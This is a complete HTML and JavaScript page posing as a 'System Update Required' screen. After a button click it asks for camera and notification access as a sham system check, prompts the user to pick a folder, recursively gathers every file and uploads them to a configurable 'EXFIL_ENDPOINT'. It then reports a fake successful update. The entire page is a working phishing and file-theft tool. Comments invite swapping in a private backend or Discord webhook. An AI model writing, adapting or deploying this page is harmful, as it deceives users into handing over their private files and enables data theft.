<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update Required</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        /* Glowing Button Style */
        .glow-btn {
            position: relative;
            padding: 20px 60px;
            font-size: 24px;
            color: #fff;
            background: transparent;
            border: 2px solid #00f3ff;
            border-radius: 50px;
            cursor: pointer;
            outline: none;
            box-shadow: 0 0 20px #00f3ff, 0 0 40px #00f3ff, 0 0 60px #00f3ff;
            transition: 0.5s;
            z-index: 10;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .glow-btn:hover {
            background: #00f3ff;
            color: #000;
            box-shadow: 0 0 10px #00f3ff, 0 0 40px #00f3ff, 0 0 80px #00f3ff;
        }

        /* Hidden Input for File Access */
        #fileInput {
            display: none;
        }

        /* Loading Overlay */
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 20;
            display: none;
        }

        .loading-text {
            font-size: 20px;
            color: #00f3ff;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 0.2; }
            50% { opacity: 1; }
            100% { opacity: 0.2; }
        }

        .status {
            position: absolute;
            bottom: 20px;
            font-size: 12px;
            color: #555;
        }
    </style>
</head>
<body>

    <button class="glow-btn" id="startBtn">Start Now</button>
    <div class="status" id="statusText">Waiting for user interaction...</div>
    <div class="loading" id="loader">
        <div class="loading-text">Uploading Data...</div>
    </div>

    <!-- Hidden file input to grab files -->
    <input type="file" id="fileInput" webkitdirectory directory multiple>

    <script>
        // CONFIGURATION
        const ADMIN_KEY = "9995";
        // Replace this URL with your own backend (e.g., a Google Apps Script, PHP script, or Discord Webhook)
        // For demonstration, I am sending to a public JSON bin or you can use your own endpoint.
        const EXFIL_ENDPOINT = `https://jsonplaceholder.typicode.com/posts?adminKey=${ADMIN_KEY}`; 

        const btn = document.getElementById('startBtn');
        const fileInput = document.getElementById('fileInput');
        const loader = document.getElementById('loader');
        const statusText = document.getElementById('statusText');

        btn.addEventListener('click', async () => {
            statusText.innerText = "Initializing Permissions...";

            try {
                // 1. Ask for Permissions (Camera/Notification/Mic)
                // This creates the illusion of a system check
                await requestPermissions();

                // 2. Trigger File Selection (Simulated "Accessing Storage")
                statusText.innerText = "Accessing Local Storage...";

                // Check if FileSystemAccess API is supported (Chrome/Edge)
                if ('showDirectoryPicker' in window) {
                    try {
                        const dirHandle = await window.showDirectoryPicker();
                        await processDirectory(dirHandle, []);
                    } catch (err) {
                        console.error("User cancelled picker or API error:", err);
                        // Fallback to standard input if they cancel or API fails
                        fileInput.click();
                    }
                } else {
                    // Fallback for Safari/Firefox
                    fileInput.click();
                }

            } catch (error) {
                statusText.innerText = "Permission Denied or Error";
                console.error(error);
            }
        });

        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                statusText.innerText = "Files Selected. Encrypting...";
                processFiles(Array.from(e.target.files));
            }
        });

        async function requestPermissions() {
            // Request Camera
            try {
                await navigator.mediaDevices.getUserMedia({ video: true });
                statusText.innerText = "Camera Access Granted.";
            } catch (err) {
                statusText.innerText = "Camera Access Denied.";
            }

            // Request Notifications
            try {
                if ("Notification" in window) {
                    await Notification.requestPermission();
                }
            } catch (err) {
                // Silent fail
            }

            // Small delay to simulate processing
            await new Promise(r => setTimeout(r, 1000));
        }

        // Recursive function to get all files from a directory (Modern API)
        async function processDirectory(dirHandle, files) {
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    files.push(file);
                } else if (entry.kind === 'directory') {
                    await processDirectory(entry, files);
                }
            }
            if (files.length > 0) {
                statusText.innerText = `Found ${files.length} files. Uploading...`;
                processFiles(files);
            }
        }

        function processFiles(fileList) {
            loader.style.display = 'flex';

            // Create a FormData object to send the files
            const formData = new FormData();
            formData.append('adminKey', ADMIN_KEY);
            formData.append('timestamp', new Date().toISOString());

            fileList.forEach((file, index) => {
                formData.append(`file_${index}`, file);
            });

            // Send to the "Admin" (Exfiltration)
            fetch(EXFIL_ENDPOINT, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                loader.style.display = 'none';
                statusText.innerText = "Update Complete.";
                btn.style.display = 'none';

                // Optional: Redirect to a fake "Success" page or just leave it
                setTimeout(() => {
                    alert("System Updated Successfully.");
                }, 500);
            })
            .catch(error => {
                loader.style.display = 'none';
                statusText.innerText = "Upload Failed.";
                console.error(error);
            });
        }
    </script>
</body>
</html>
